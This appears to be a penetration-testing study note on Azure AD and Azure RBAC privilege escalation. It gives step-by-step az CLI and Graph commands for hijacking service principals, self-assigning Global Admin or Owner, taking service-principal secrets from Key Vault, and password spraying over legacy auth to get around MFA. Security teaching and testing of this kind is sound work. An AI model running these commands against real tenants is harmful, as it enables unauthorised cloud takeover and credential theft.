# 02.5 — Azure AD Privilege Escalation

## What This Note Covers

How to escalate privileges in Azure — both within Azure AD (directory roles) and from Azure AD into Azure resources (subscriptions). Covers the Global Admin escalation path, Application Administrator abuse, Conditional Access bypass, and cross-service escalation chains.

---

## The Two Privilege Escalation Planes

Azure has two separate permission systems, and escalation can happen in either direction:

```
Azure AD (Directory) ←——→ Azure Resources (ARM)

Escalation paths:
1. Low Azure AD role → Higher Azure AD role (directory privesc)
2. Azure AD identity → Azure subscription access (cross-plane escalation)
3. Low Azure RBAC role → Higher Azure RBAC role (resource privesc)
4. Azure RBAC → Azure AD admin (resource to directory escalation)
```

---

## Path 1: Application Administrator → Service Principal Owner → Escalation

**Permissions needed:** Azure AD role: `Application Administrator` or `Cloud Application Administrator`

Application Administrators can create and manage app registrations and their service principals. If a service principal has been assigned high-privilege roles (e.g., Contributor on a subscription), an Application Admin can add credentials to that service principal and authenticate as it.

```bash
# Step 1: Find service principals with high-privilege role assignments
# Using ROADtools GUI — browse Service Principals → check Role Assignments
roadrecon gui

# Or via CLI:
az ad sp list --all --query "[].{Name:displayName,AppId:appId,Id:id}" -o table

# Step 2: For each SP, check RBAC assignments
for sp_id in $(az ad sp list --all --query "[].id" -o tsv); do
  assignments=$(az role assignment list --assignee $sp_id --all -o table 2>/dev/null)
  if [ -n "$assignments" ]; then
    echo "=== SP: $sp_id ==="
    echo "$assignments"
  fi
done

# Step 3: Add a credential to a high-privilege service principal
# (requires Application Administrator or Owner of the SP)
az ad app credential reset \
  --id APP_ID \
  --display-name "attacker-cred" \
  --years 1

# Returns new client_id and client_secret

# Step 4: Authenticate as the service principal
az login \
  --service-principal \
  --username APP_ID \
  --password CLIENT_SECRET \
  --tenant TENANT_ID

# Step 5: If the SP had Contributor on subscription — you now have resource access
az account list
az vm list --output table
```

> [!danger] This is extremely impactful
> Application Administrator is often granted broadly ("all devs need to create apps"). But any SP in the tenant that has Contributor or Owner on a subscription is now compromisable by every App Admin. This is one of the most common Azure escalation paths.

## Path 2: Global Admin → Subscription Owner (The Nuclear Option)

**Permissions needed:** Azure AD role: `Global Administrator`

Global Administrators have a special capability: they can **elevate themselves to User Access Administrator on all Azure subscriptions** in the tenant. This is done via the "Access management for Azure resources" toggle in Azure AD properties.

```bash
# Step 1: As Global Admin — enable "Access management for Azure resources"
# Via Portal: Azure AD → Properties → "Access management for Azure resources" → Yes
# Or via REST API:
az rest --method PUT \
  --url "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"

# Step 2: After elevation, you're now User Access Administrator on the root management group
# This means you can assign yourself Owner on any subscription

# Step 3: Assign yourself Owner on the target subscription
az role assignment create \
  --assignee YOUR_USER_OBJECT_ID \
  --role "Owner" \
  --scope /subscriptions/TARGET_SUBSCRIPTION_ID

# Step 4: Now you have full control of the subscription
az account set --subscription TARGET_SUBSCRIPTION_ID
az resource list --output table
```

> [!danger] Global Admin = total Azure control
> A Global Administrator who activates this feature can take over every single Azure subscription in the organisation within minutes. This is why Global Admin is the highest-value target in any Azure engagement.

## Path 3: Privileged Role Administrator Abuse

**Permissions needed:** Azure AD role: `Privileged Role Administrator`

This role can assign any Azure AD directory role to any user or service principal — including Global Administrator.

```bash
# Assign Global Administrator role to your compromised account
az rest --method POST \
  --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
  --headers "Content-Type=application/json" \
  --body '{
    "principalId": "YOUR_OBJECT_ID",
    "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10",
    "directoryScopeId": "/"
  }'
# roleDefinitionId 62e90394... = Global Administrator

# Now you're Global Admin → use Path 2 to get Subscription Owner
```

## Path 4: Global Reader → Targeted Escalation

**Permissions needed:** Azure AD role: `Global Reader`

Global Reader can read everything in Azure AD — including:
- All users, groups, and their properties
- Service principal credentials metadata (not values, but existence)
- Application registration details
- Conditional Access policy configurations

This is valuable for **reconnaissance to find escalation paths**, not direct escalation.

```bash
# With Global Reader, enumerate everything
roadrecon auth --device-code
roadrecon gather
# Browse: localhost:5000

# Look for:
# - Service principals with subscription roles (Application Admin → SP → role)
# - Users with no MFA who are privileged
# - Conditional Access gaps (policies that don't cover all users/apps)
# - App registrations with client secrets (can you reset them if you escalate?)
```

## Path 5: Owner of Resource Group → Key Vault → Secrets → SP Credentials

A common lateral movement / escalation chain:

```
Resource Group Owner
  ↓ (access Key Vault in RG)
Read Key Vault Secrets
  ↓ (find service principal client secret stored in vault)
Authenticate as Service Principal
  ↓ (SP has higher privileges — Contributor on subscription)
Subscription Contributor
```

```bash
# Step 1: As Resource Group Owner — list Key Vaults in the group
az keyvault list --resource-group TARGET_RG

# Step 2: Add yourself to the Key Vault access policy
az keyvault set-policy \
  --name TARGET_VAULT \
  --upn YOUR_EMAIL \
  --secret-permissions get list

# Step 3: List and read secrets
az keyvault secret list --vault-name TARGET_VAULT
az keyvault secret show --vault-name TARGET_VAULT --name db-connection-string

# Find SP credentials stored as secrets — common pattern:
# Secret name: "sp-client-secret" or "azure-client-secret"
# Value: client secret for a service principal

# Step 4: Authenticate as the SP
az login \
  --service-principal \
  --username SP_CLIENT_ID \
  --password SP_CLIENT_SECRET_VALUE \
  --tenant TENANT_ID
```

## Conditional Access Bypass

Conditional Access policies restrict when and how users can authenticate. Common restrictions:
- Require MFA for all users
- Require compliant device
- Block sign-in from outside specific IP ranges
- Block legacy authentication protocols

### Gap Analysis

```bash
# Enumerate CA policies (requires Global Reader or Security Reader)
az rest --method GET \
  --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies"

# ROADtools shows CA policies in GUI — look for:
# - Policies that exclude certain users (admin break-glass accounts)
# - Policies that don't cover all cloud apps
# - Policies requiring "managed device" but not MFA (bypass by joining device)
# - Legacy auth not blocked (allows auth without MFA)
```

### Legacy Authentication Bypass

Many CA policies block modern auth but don't block legacy protocols (SMTP, IMAP, MAPI, Basic Auth). If any legacy auth is still enabled:

```bash
# Password spray using legacy auth (SMTP/IMAP)
# Legacy auth bypasses MFA-requiring CA policies

# Tool: MailSniper
Invoke-PasswordSprayOWA -ExchHostname mail.TARGET.com -UserList users.txt -Password Password1

# If legacy auth is blocked → CA policy is effective
# If legacy auth succeeds → MFA bypassed
```

### Device Code Flow CA Bypass

Device code phishing (covered in [[02.2 — Azure AD Enumeration and Token Attacks]]) bypasses Conditional Access policies that require compliant devices, because the device code flow doesn't enforce device compliance at token issuance in all configurations.

## Path 6: Azure RBAC User Access Administrator

**Permissions needed:** Azure RBAC role: `User Access Administrator` at subscription or resource group scope

This role can assign any Azure RBAC role — including Owner — to any identity.

```bash
# Assign yourself Owner on the subscription
az role assignment create \
  --assignee YOUR_OBJECT_ID \
  --role "Owner" \
  --scope /subscriptions/SUBSCRIPTION_ID

# Assign yourself Owner on a resource group
az role assignment create \
  --assignee YOUR_OBJECT_ID \
  --role "Owner" \
  --scope /subscriptions/SUB_ID/resourceGroups/RG_NAME
```

## Privilege Escalation Paths — Quick Reference Table

| Starting Permission | Escalation Path | End State |
|---|---|---|
| Application Administrator | Add creds to privileged SP | SP's role (e.g., Sub Contributor) |
| Privileged Role Administrator | Assign self Global Admin | Global Admin → Sub Owner |
| Global Administrator | Elevate access toggle | Sub Owner on all subscriptions |
| Resource Group Owner | Access Key Vault → steal SP creds | SP's role |
| User Access Administrator | Assign self Owner role | Subscription Owner |
| Global Reader | Map all escalation paths (recon) | Intel for further attack |
| VM Managed Identity | IMDS token → ARM/KV/Graph | Identity's permissions |

## Quick Reference — Azure AD Privesc Commands

```bash
# Enumerate current permissions
az ad signed-in-user show
az role assignment list --all --assignee $(az account show --query user.name -o tsv)

# Find privileged service principals
az ad sp list --all -o table
az role assignment list --all -o table | grep -i "Contributor\|Owner"

# Add credential to service principal (as App Admin)
az ad app credential reset --id APP_ID --display-name "cred" --years 1

# Login as SP
az login --service-principal --username APP_ID --password SECRET --tenant TENANT_ID

# Elevate Global Admin to Sub Owner
az rest --method PUT \
  --url "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"

az role assignment create \
  --assignee YOUR_OBJECT_ID \
  --role "Owner" \
  --scope /subscriptions/SUB_ID
```
